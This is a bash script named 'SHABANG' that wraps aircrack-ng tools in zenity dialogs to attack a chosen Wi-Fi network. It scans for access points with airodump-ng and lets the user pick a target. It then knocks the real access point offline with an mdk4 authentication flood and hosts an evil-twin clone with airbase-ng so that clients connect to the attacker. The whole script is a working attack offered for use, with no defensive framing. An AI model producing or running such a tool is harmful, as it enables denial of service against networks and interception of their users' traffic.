#!/bin/bash

# --- 1. Selection ---
IFACE=$(zenity --list --title="SHABANG: Select Card" --column="Interface" $(ls /sys/class/net | grep wlan))
[ -z "$IFACE" ] && exit 1

# --- 2. Live Monitor & Selection Phase ---
rm -f /tmp/shabang*
# Launching the live monitor so you can see who to target
gnome-terminal --title="1. MONITORING AIRWAVES" -- airodump-ng $IFACE --band g -w /tmp/shabang --output-format csv &
SCAN_PID=$!

# Logic Gate: Wait for the file to exist
while [ ! -f /tmp/shabang-01.csv ]; do sleep 1; done

zenity --info --text="SCANNING... \n\n1. Watch the terminal for your target.\n2. Click OK here to pick it from the GUI list." --width=300
kill $SCAN_PID

# --- 3. The Target GUI ---
# This pulls the 'Monitored' data into a clickable list
TARGET_RAW=$(awk -F, 'NR>2 {print $1 "|" $14}' /tmp/shabang-01.csv | zenity --list --title="2. SELECT TARGET" --column="BSSID" --column="SSID" --delimiter="|")

BSSID=$(echo $TARGET_RAW | cut -d'|' -f1 | tr -d ' ')
SSID=$(echo $TARGET_RAW | cut -d'|' -f2 | tr -d ' ')
CH=$(grep "$BSSID" /tmp/shabang-01.csv | awk -F, '{print $4}' | tr -d ' ')

if [ -z "$BSSID" ]; then exit 1; fi

# --- 4. The Attack Logic ---
sudo iw dev $IFACE set channel $CH

# Window 1: Crash the Real AP (SAE Flood)
gnome-terminal --title="CRASHING $BSSID" -- sudo mdk4 $IFACE a -a $BSSID -m -s 1000 &

# Window 2: Host the Trap (Evil Twin)
# Simplified to avoid "Option not available" error
gnome-terminal --title="TRAPPING $SSID" -- sudo airbase-ng -e "$SSID" -c $CH $IFACE &

zenity --info --text="SHABANG ACTIVE.\n\nTarget: $SSID\nClients will now roam to your clone."
